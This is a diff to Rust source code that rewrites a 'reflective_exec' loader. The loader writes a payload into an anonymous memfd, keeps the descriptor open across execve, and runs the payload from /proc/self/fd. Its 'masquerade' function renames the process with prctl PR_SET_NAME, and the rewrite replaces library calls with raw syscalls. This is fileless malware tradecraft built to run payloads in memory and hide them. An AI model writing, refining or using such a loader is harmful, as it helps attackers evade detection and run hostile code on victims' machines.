@@ -1,35 +1,44 @@
-use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
-use nix::unistd::execve;
+use sc::syscall;
 use std::ffi::CString;
-use std::fs::File;
 use std::io::Write;
 use std::os::unix::io::FromRawFd;
-use std::os::unix::io::AsRawFd;
-use libc::{prctl, PR_SET_NAME};
+use std::fs::File;
+use libc::PR_SET_NAME;
 
 pub fn reflective_exec(payload: &[u8], fake_name: &str) -> Result<(), Box<dyn std::error::Error>> {
-    let name = CString::new("sophia_memfd").unwrap();
-    // Fixed: Removed MFD_CLOEXEC so the file descriptor survives execve
-    let fd = memfd_create(&name, MemFdCreateFlag::empty())?;
+    let name = "sophia_memfd";
+    let name_cstr = CString::new(name).unwrap();
 
-    let raw_fd = fd.as_raw_fd();
-    let mut file = unsafe { File::from_raw_fd(raw_fd) };
+    let fd_res = unsafe { syscall!(MEMFD_CREATE, name_cstr.as_ptr(), 0) };
+
+    if (fd_res as i64) < 0 {
+        return Err("memfd_create failed".into());
+    }
+    let fd = fd_res as i32;
+
+    let mut file = unsafe { File::from_raw_fd(fd) };
     file.write_all(payload)?;
 
-    let path = CString::new(format!("/proc/self/fd/{}", raw_fd)).unwrap();
-    let argv = vec![CString::new(fake_name).unwrap()];
-    let env = vec![CString::new("PATH=/usr/bin:/bin").unwrap()];
+    let path = format!("/proc/self/fd/{}", fd);
+    let path_cstr = CString::new(path).unwrap();
+    let fake_name_cstr = CString::new(fake_name).unwrap();
+
+    let argv: [*const libc::c_char; 2] = [fake_name_cstr.as_ptr(), std::ptr::null()];
+    let envp: [*const libc::c_char; 1] = [std::ptr::null()];
 
     masquerade(fake_name);
 
-    execve(&path, &argv, &env)?;
-    Ok(())
+    unsafe {
+        syscall!(EXECVE, path_cstr.as_ptr(), argv.as_ptr(), envp.as_ptr());
+    }
+
+    Err("execve failed".into())
 }
 
 pub fn masquerade(fake_name: &str) {
     let c_name = CString::new(fake_name).unwrap();
     unsafe {
-        prctl(PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
+        syscall!(PRCTL, PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
     }
 }
 
